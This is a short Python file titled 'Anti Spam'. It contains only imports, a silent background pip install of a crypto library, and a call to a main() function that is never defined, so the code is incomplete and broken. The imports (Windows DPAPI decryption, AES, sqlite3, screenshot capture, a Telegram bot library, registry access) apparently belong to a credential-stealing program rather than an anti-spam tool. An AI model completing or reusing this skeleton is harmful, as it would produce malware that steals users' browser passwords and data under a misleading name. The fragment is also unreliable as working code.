#Anti Spam
import os
import time
import sys
import subprocess
# import pyautogui
import mss
from mss import tools
import wmi
import threading
import requests
import base64
from sqlite3 import connect as sql_connect
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import shutil
import ctypes
import random
import psutil
import getpass
import json
import re
import telebot, urllib,winreg
import warnings
from base64 import b64decode
from io import BytesIO
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from sys import executable, stderr
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
disable_warnings_urllib3()
ModuleRequirements = [
    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
]
for module in ModuleRequirements:
    try: 
        __import__(module[0])
    except:
        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
        time.sleep(3)


if __name__ == "__main__":
    main()

